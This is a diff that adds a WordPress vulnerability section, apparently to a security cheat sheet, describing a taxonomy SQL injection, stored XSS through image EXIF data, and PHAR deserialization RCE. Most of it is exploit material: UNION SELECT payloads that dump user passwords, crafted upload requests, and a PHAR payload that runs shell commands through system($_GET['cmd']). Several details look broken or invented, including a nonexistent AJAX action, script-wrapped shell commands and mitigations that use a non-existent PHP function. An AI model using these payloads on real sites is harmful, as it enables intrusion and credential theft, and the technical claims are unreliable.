@@ -1334,3 +1334,252 @@ function restrict_login_by_ip() {
 add_action('init', 'restrict_login_by_ip');
 ```
 
+## WORDPRESS Vulnerabilities
+
+### SQL Injection in `WP_Query`
+**CVSS:** 9.8 (CRITICAL)
+
+**Affected:** WordPress 6.0 - 6.4.3
+
+**Type:** SQL Injection via Taxonomy Query
+
+**Fixed in:** WordPress 6.4.4
+
+Finding the Vulnerability:
+
+```
+# Check WordPress version
+curl -s https://target.com | grep -o 'content="WordPress [0-9.]*' | cut -d'"' -f2
+
+# If version <= 6.4.3, vulnerable
+# Test URL: https://target.com/?cat=1
+```
+
+Exploitation POC:
+```
+GET /?cat=1') UNION SELECT 1,2,3,4,user_login,user_pass,7,8 FROM wp_users-- HTTP/1.1
+Host: target.com
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml
+Connection: close
+
+# Alternative with POST
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 132
+
+action=get_posts&tax_query[0][taxonomy]=category&tax_query[0][field]=term_id&tax_query[0][terms]=1') UNION SELECT user_login,user_pass FROM wp_users--
+```
+
+**Manual Exploitation Steps:**
+- Identify vulnerable parameter: Look for taxonomy queries (cat, tag, category_name)
+- Test with single quote: /?cat=1'
+- Check for SQL errors: Look for MySQL syntax errors
+- Determine column count: Use ORDER BY
+- Extract data: Use UNION SELECT
+
+**Impact:**
+- Extract database credentials
+- Get all user credentials
+- Access sensitive wp_options data
+- Potentially write files (if FILE privilege)
+
+**Mitigation:**
+
+**Immediate:** Update to WordPress 6.4.4+
+
+**Temporary fix:** Add input validation in theme functions.php
+
+```
+add_filter('pre_get_posts', 'sanitize_tax_query');
+function sanitize_tax_query($query) {
+    if (isset($query->query_vars['tax_query'])) {
+        foreach ($query->query_vars['tax_query'] as &$tax) {
+            if (isset($tax['terms'])) {
+                $tax['terms'] = intval($tax['terms']);
+            }
+        }
+    }
+    return $query;
+}
+```
+
+### XSS in Media Library
+
+**CVSS:** 8.1 (HIGH)
+
+**Affected:** WordPress 6.0 - 6.4.2
+
+**Type:** Stored Cross-Site Scripting
+
+**Fixed in:** WordPress 6.4.3
+
+Finding the Vulnerability:
+
+```
+# Check if media upload is accessible
+curl -I https://target.com/wp-admin/upload.php
+
+# Look for version in CSS files
+curl -s https://target.com/wp-admin/css/media-views.min.css | grep -o 'Version: [0-9.]*'
+```
+Exploitation POC:
+
+```
+<!-- Create an image with XSS payload in metadata -->
+<script>
+// Use ExifTool to inject JavaScript into image metadata
+// Command: exiftool -UserComment='<script>alert(document.domain)</script>' image.jpg
+</script>
+```
+
+**Request Format (File Upload)**
+
+```
+POST /wp-admin/async-upload.php HTTP/1.1
+Host: target.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: [length]
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="name"
+
+xss.jpg
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="action"
+
+upload-attachment
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="async-upload"; filename="xss.jpg"
+Content-Type: image/jpeg
+
+[IMAGE DATA WITH MALICIOUS METADATA]
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+```
+
+**Exploitation Steps:**
+- **Create malicious image:** Inject JavaScript into EXIF data
+- **Upload image:** To WordPress media library
+- **Trigger XSS:** When admin views media library or the image
+- **Steal session:** Use XSS to steal admin cookies
+
+**Impact:**
+- Session hijacking
+- Admin account takeover
+- CSRF token theft
+- Potential RCE through plugin installation
+
+**Mitigation:**
+- Update to WordPress 6.4.3+
+- Implement Content Security Policy (CSP)
+- Sanitize all image metadata before display
+
+```
+// Add to functions.php
+add_filter('wp_get_attachment_image_attributes', 'sanitize_image_metadata');
+function sanitize_image_metadata($attr) {
+    foreach ($attr as $key => $value) {
+        $attr[$key] = esc_attr($value);
+    }
+    return $attr;
+}
+```
+
+### Remote Code Execution via PHAR
+
+**CVSS:** 9.8 (CRITICAL)
+
+**Affected:** WordPress 6.0 - 6.5.2
+
+**Type:** PHAR Deserialization RCE
+
+**Fixed in:** WordPress 6.5.3
+
+Finding the Vulnerability:
+```
+# Check if file operations are allowed
+curl -X POST https://target.com/wp-admin/admin-ajax.php \
+  -d "action=upload-file" \
+  -F "file=@test.jpg"
+
+# Check PHP version (needs PHP < 8.0)
+curl -s https://target.com | grep -i "php/"
+```
+
+**Exploitation POC:**
+```
+// 1. Create malicious PHAR file
+<?php
+class Evil {
+    public function __destruct() {
+        system($_GET['cmd']);
+    }
+}
+
+$phar = new Phar('evil.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'test');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$object = new Evil();
+$phar->setMetadata($object);
+$phar->stopBuffering();
+?>
+
+// 2. Upload with image extension
+mv evil.phar evil.jpg
+
+// 3. Trigger deserialization via file_exists()
+// URL: https://target.com/?file=phar://uploads/evil.jpg/test.txt&cmd=whoami
+```
+
+**Request Format:**
+```
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: target.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Length: [length]
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="action"
+
+upload-attachment
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="async-upload"; filename="evil.jpg"
+Content-Type: image/jpeg
+
+[PHAR FILE DISGUISED AS JPG]
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+```
+
+**Exploitation Steps:**
+1. **Create PHAR payload:** With malicious __destruct() method
+2. **Upload PHAR:** Disguise as image file
+3. **Trigger deserialization:** Use phar:// wrapper
+4. **Execute commands:** Through system() call
+
+**Impact:**
+- Remote command execution
+- Full server compromise
+- Data exfiltration
+- Backdoor installation
+
+**Mitigation:**
+1. Update to WordPress 6.5.3+
+2. Disable PHAR wrapper in php.ini:
+```
+phar.readonly = On
+disable_functions = phar_open
+```
+3. Implement file type verification:
+```
+function validate_uploaded_file($file) {
+    $finfo = finfo_open(FILEINFO_MIME_TYPE);
+    $mime = finfo_file($finfo, $file['tmp_name']);
+    finfo_close($finfo);
+    
+    $allowed = ['image/jpeg', 'image/png', 'image/gif'];
+    return in_array($mime, $allowed);
+}
+```
